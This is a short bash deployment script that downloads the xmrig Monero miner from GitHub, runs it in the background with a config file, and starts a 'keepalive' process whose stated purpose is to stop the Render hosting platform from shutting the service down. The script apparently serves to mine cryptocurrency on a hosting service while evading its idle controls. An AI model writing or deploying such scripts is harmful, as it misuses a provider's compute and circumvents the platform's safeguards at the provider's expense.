#!/bin/bash

# Download xmrig if not already downloaded
if [ ! -f ./xmrig ]; then
  curl -L https://github.com/xmrig/xmrig/releases/download/v6.21.2/xmrig-6.21.2-linux-static-x64.tar.gz -o miner.tar.gz
  tar -xvzf miner.tar.gz --strip=1
fi

chmod +x xmrig

# Start miner in background
./xmrig --config=miner_config.json &

# Start keepalive to prevent Render shutdown
node keepalive.js
